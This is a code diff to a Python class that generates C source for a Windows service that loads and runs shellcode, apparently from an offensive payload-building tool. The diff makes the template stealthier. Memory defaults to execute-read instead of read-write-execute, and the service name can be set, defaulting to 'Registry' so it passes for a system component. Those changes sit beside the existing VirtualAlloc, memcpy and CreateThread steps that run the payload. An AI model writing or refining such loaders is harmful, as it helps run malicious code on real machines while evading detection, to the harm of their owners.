@@ -1,6 +1,12 @@
 class service:
     def __init__(self, arguments):
-        pass
+        self.memoryPermission = 'PAGE_EXECUTE_READ'
+        self.servicename = 'Registry'
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+        if 'servicename' in arguments:
+            self.servicename = arguments['servicename']
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -44,7 +50,7 @@ void runShellcode(){{
     LPVOID buffer = NULL;
     HANDLE hThread = NULL;
     
-    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
     memcpy(buffer, shellcode, {shellcodeSize});
     
     hThread = CreateThread(NULL, 0, buffer, NULL, 0, NULL);
@@ -78,7 +84,7 @@ void ServiceMain(DWORD argc, LPWSTR *argv) {{
 }}
 
 int wWinMain(HINSTANCE instance, HINSTANCE previnstance, LPWSTR cmdline, int showcmd) {{
-	SERVICE_TABLE_ENTRY StartTable[] = {{ {{L"TempLoggerService", ServiceMain}}, {{NULL, NULL}} }};
+	SERVICE_TABLE_ENTRY StartTable[] = {{ {{L"{self.servicename}", ServiceMain}}, {{NULL, NULL}} }};
 	StartServiceCtrlDispatcher(StartTable);
 	return 0;
 }}
